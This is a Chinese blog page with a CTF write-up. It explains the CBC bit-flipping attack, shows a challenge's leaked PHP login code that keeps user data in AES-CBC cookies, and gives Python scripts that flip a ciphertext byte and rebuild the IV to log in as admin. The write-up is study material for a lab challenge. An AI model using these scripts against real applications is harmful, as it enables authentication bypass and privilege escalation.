<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="CBC翻转攻击方法的精髓在于：
通过损坏密文字节来改变明文字节。(注：借助CBC内部的模式)借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。
介绍一下CBC字节翻转攻击的原理


Plaintext：待加密的数据。 

IV：用于随机化加密的比特块，保证即">
    

    <!--Author-->
    
        <meta name="author" content="0xEaS">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="CBC翻转攻击"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="船到桥头自然直"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    
        <meta name="twitter:card" content="summary" />
    
    
    

    <!-- Title -->
    
    <title>CBC翻转攻击 - 船到桥头自然直</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    
<link rel="stylesheet" href="/css/style.css">


    <!-- Google Analytics -->
    


<meta name="generator" content="Hexo 5.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact.html">
                    Contact
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2021/05/12/CBC%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">
                CBC翻转攻击
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2021-05-12</span>
            
            
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <p><strong>CBC翻转攻击方法的精髓在于：</strong></p>
<p>通过损坏密文字节来改变明文字节。(注：借助CBC内部的模式)借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p>
<p><strong>介绍一下CBC字节翻转攻击的原理</strong></p>
<p><img src="/images/92.png"></p>
<ol>
<li><p>Plaintext：待加密的数据。 </p>
</li>
<li><p>IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p>
</li>
<li><p>Ciphertext：加密后的数据。</p>
<p><strong>在这里重要的一点是，CBC工作于一个固定长度的比特组，将其称之为块。在本文中，我们将使用包含16字节的块。</strong></p>
</li>
</ol>
<p>整个加密的过程简单说来就是：</p>
<pre><code>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。
生成一个随机的初始化向量(IV)和一个密钥。
将IV和第一组明文异或。
用密钥对3中xor后产生的密文加密。
用4中产生的密文对第二组明文进行xor操作。
用密钥对5中产生的密文加密。
重复4-7，到最后一组明文。
将IV和加密后的密文拼接在一起，得到最终的密文。</code></pre>
<p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：前一块的密文用来产生后一块的密文。<br><img src="/images/93.png"></p>
<p>这是解密过程，解密的过程其实只要理解了加密，反过来看解密过程就也很简单了，同样的，前一块密文参与下一块密文的还原。</p>
<pre><code>从密文中提取出IV，然后将密文分组。
使用密钥对第一组的密文解密，然后和IV进行xor得到明文。
使用密钥对第二组密文解密，然后和2中的密文xor得到明文。
重复2-3，直到最后一组密文。</code></pre>
<p>这幅图是我们进行翻转攻击的原理图：<br><img src="/images/94.png"></p>
<p>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p>
<p>具体怎么翻转呢，因为涉及到异或，这里稍微介绍下异或的概念：</p>
<pre><code>当我们的一个值C是由A和B异或得到
C = A XOR B
那么
A XOR B XOR C很明显是=0的
当我们知道B和C之后，想要得到A的值也很容易
A = B XOR C
因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变</code></pre>
<p><strong>题目</strong></p>
<p>首先，尝试用常见的用户名测试一下，root，user，admin等</p>
<p><img src="/images/95.png"></p>
<p>当登录其他的用户名时，返回来了提示only admin can see flag </p>
<p><img src="/images/96.png"></p>
<p>当尝试用admin登录时，却说admin不允许登录 </p>
<p><img src="/images/97.png"></p>
<p>存在源码泄露</p>
<pre><code>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
&lt;title&gt;Login Form&lt;/title&gt;
&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;
&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
$(document).ready(function() &#123;
    $(&quot;.username&quot;).focus(function() &#123;
        $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);
    &#125;);
    $(&quot;.username&quot;).blur(function() &#123;
        $(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);
    &#125;);
    $(&quot;.password&quot;).focus(function() &#123;
        $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);
    &#125;);
    $(&quot;.password&quot;).blur(function() &#123;
        $(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);
    &#125;);
&#125;);
&lt;/script&gt;
&lt;/head&gt;
&lt;?php
define(&quot;SECRET_KEY&quot;, file_get_contents(&#39;/root/key&#39;));
define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);
session_start();
function get_random_iv()&#123;
    $random_iv=&#39;&#39;;
    for($i=0;$i&lt;16;$i++)&#123;
        $random_iv.=chr(rand(1,255));
    &#125;
    return $random_iv;
&#125;
function login($info)&#123;
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];
    setcookie(&quot;iv&quot;, base64_encode($iv));
    setcookie(&quot;cipher&quot;, base64_encode($cipher));
&#125;
function check_login()&#123;
    if(isset($_COOKIE[&#39;cipher&#39;]) &amp;&amp; isset($_COOKIE[&#39;iv&#39;]))&#123;
        $cipher = base64_decode($_COOKIE[&#39;cipher&#39;]);
        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;
            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&#39;&quot;.base64_encode($plain).&quot;&#39;) can&#39;t unserialize&lt;/p&gt;&quot;);
            $_SESSION[&#39;username&#39;] = $info[&#39;username&#39;];
        &#125;else&#123;
            die(&quot;ERROR!&quot;);
        &#125;
    &#125;
&#125;
function show_homepage()&#123;
    if ($_SESSION[&quot;username&quot;]===&#39;admin&#39;)&#123;
        echo &#39;&lt;p&gt;Hello admin&lt;/p&gt;&#39;;
        echo &#39;&lt;p&gt;Flag is $flag&lt;/p&gt;&#39;;
    &#125;else&#123;
        echo &#39;&lt;p&gt;hello &#39;.$_SESSION[&#39;username&#39;].&#39;&lt;/p&gt;&#39;;
        echo &#39;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#39;;
    &#125;
    echo &#39;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#39;;
&#125;
if(isset($_POST[&#39;username&#39;]) &amp;&amp; isset($_POST[&#39;password&#39;]))&#123;
    $username = (string)$_POST[&#39;username&#39;];
    $password = (string)$_POST[&#39;password&#39;];
    if($username === &#39;admin&#39;)&#123;
        exit(&#39;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#39;);
    &#125;else&#123;
        $info = array(&#39;username&#39;=&gt;$username,&#39;password&#39;=&gt;$password);
        login($info);
        show_homepage();
    &#125;
&#125;else&#123;
    if(isset($_SESSION[&quot;username&quot;]))&#123;
        check_login();
        show_homepage();
    &#125;else&#123;
        echo &#39;&lt;body class=&quot;login-body&quot;&gt;
                &lt;div id=&quot;wrapper&quot;&gt;
                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;
                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;
                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;
                        &lt;div class=&quot;header&quot;&gt;
                        &lt;h1&gt;Login Form&lt;/h1&gt;
                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;
                        &lt;/div&gt;
                        &lt;div class=&quot;content&quot;&gt;
                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#39;\&#39;&quot; /&gt;
                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#39;\&#39;&quot; /&gt;
                        &lt;/div&gt;
                        &lt;div class=&quot;footer&quot;&gt;
                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;
                        &lt;/div&gt;
                    &lt;/form&gt;
                &lt;/div&gt;
            &lt;/body&gt;&#39;;
    &#125;
&#125;
?&gt;
&lt;/html&gt;</code></pre>
<p>代码中可以看出考察的是cbc字节反转攻击，而且是用了及其简单的CBC。</p>
<p>仔细审计代码<br> 我们先发送正常请求</p>
<pre><code>username=zdmin&amp;password=12345（如果有正确密码用正确密码登录）</code></pre>
<p><img src="/images/98.png"></p>
<p>把里面的cipher进行翻转</p>
<pre><code># -*- coding: utf-8 -*-
import base64
import requests
import urllib
iv_raw=&#39;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&#39;  #这里填写第一次返回的iv值
cipher_raw=&#39;8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D&#39;  #这里填写第一次返回的cipher值
print &quot;[*]原始iv和cipher&quot;
print &quot;iv_raw:  &quot; + iv_raw
print &quot;cipher_raw:  &quot; + cipher_raw
print &quot;[*]对cipher解码，进行反转&quot;
cipher = base64.b64decode(urllib.unquote(cipher_raw))
xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&#39;z&#39;) ^ ord(&#39;a&#39;)) + cipher[10:]  #请根据你的输入自行更改，原理看上面的介绍
xor_cipher=urllib.quote(base64.b64encode(xor_cipher))
print &quot;反转后的cipher：&quot; + xor_cipher</code></pre>
<p><img src="/images/99.png"></p>
<p><strong>然后再bp中的cookie中设置iv和翻转后的cipher，注意，这里要把post的数据清空，否则会重复开始的流程，就进不了这个流程了</strong></p>
<p><img src="/images/100.png"></p>
<p>服务器提示反序列化失败，但是其实我们这个时候只要对这个进行base64解码就会发现，我们的username已经变成了admin，但是要注意的是，这里得到的其实只是php将密文解密后并且异或后产生的一段错误的plaintext，并非编码后的密文。<br>原因是在我们为了修改mdmin为admin的时候，是通过修改第一块数据来修改的，所以第一个块数据（16字节）被破坏了。因为程序中要求username要等于admin所以不能利用文章里的说的填充字符。 又因为是第一个块数据被破坏，第一个块数据是和IV有关，所以只要将在CBC字符翻转攻击，得到新的IV就可以修复第一块数据。<br>具体办法如下</p>
<pre><code># -*- coding: utf-8 -*-
import base64
import urllib
cipher = &#39;Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9&#39;#填写提交后所得的无法反序列化密文
iv = &#39;%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D&#39;#一开始提交的iv
#cipher = urllib.unquote(cipher)
cipher = base64.b64decode(cipher)
iv = base64.b64decode(urllib.unquote(iv))
newIv = &#39;&#39;
right = &#39;a:2:&#123;s:8:&quot;userna&#39;#被损坏前正确的明文
for i in range(16):
    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #这一步相当于把原来iv中不匹配的部分修改过来
print urllib.quote(base64.b64encode(newIv))</code></pre>
<p><img src="/images/101.png"></p>
<p>把得到的新的修复的iv值替换掉，cipher仍然为翻转后的cipher<br> 提交，就可以成功进去</p>
<p><img src="/images/102.png"></p>
<p>类似的题目还有ISCC2021-客服冲冲冲二</p>
<p>文章摘自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/csu_vc/article/details/79619309">https://blog.csdn.net/csu_vc/article/details/79619309</a></p>

    </div>

    

    

    <!-- Comments -->
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2022/03/10/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-NTLM-Relay%E6%94%BB%E5%87%BB/">内网渗透篇-NTLM Relay攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/03/06/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9D%9E%E7%BA%A6%E6%9D%9F-%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">内网渗透篇-非约束/约束委派攻击</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AF%87-%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/">内网渗透篇-隧道代理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2022/02/20/Thinkphp6-0-12LTS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">Thinkphp6.0.12LTS反序列化漏洞分析</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>